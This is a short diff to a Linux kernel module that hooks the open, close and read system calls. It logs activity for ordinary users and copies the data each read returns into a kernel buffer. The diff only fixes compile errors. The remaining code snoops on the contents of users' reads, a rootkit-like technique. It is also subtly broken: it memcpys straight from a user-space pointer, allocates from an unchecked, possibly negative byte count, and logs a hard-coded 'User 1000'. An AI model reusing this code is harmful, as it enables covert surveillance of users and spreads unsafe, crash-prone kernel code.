@@ -22,7 +22,7 @@ asmlinkage long new_sys_open(const char __user *filename, int flags, umode_t mod
 asmlinkage long new_sys_close(unsigned int fd) {
     kuid_t kernel_uid = current_uid();
     if (kernel_uid.val >= 1000) {
-        printk(KERN_INFO "User %d is closing file descriptor: %d\n", (int)kernel_id.val, file_descriptor);
+        printk(KERN_INFO "User %d is closing file descriptor: %d\n", (int)kernel_uid.val, fd);
     }
     return ref_sys_close(fd);
 }
@@ -33,7 +33,8 @@ asmlinkage long new_sys_read(int fd, void __user *buf, size_t count) {
     if (kernel_uid.val >= 1000) {
         printk(KERN_INFO "User 1000 read from file descriptor %d", fd);
     }
-    ssize_t bytes_read = ref_sys_read(fd, buf, count);
+    ssize_t bytes_read;
+    bytes_read = ref_sys_read(fd, buf, count);
     char* buf_copy = kmalloc(bytes_read+1, GFP_KERNEL);
     memcpy(buf_copy, buf, bytes_read);
     buf_copy[bytes_read] = '\0';
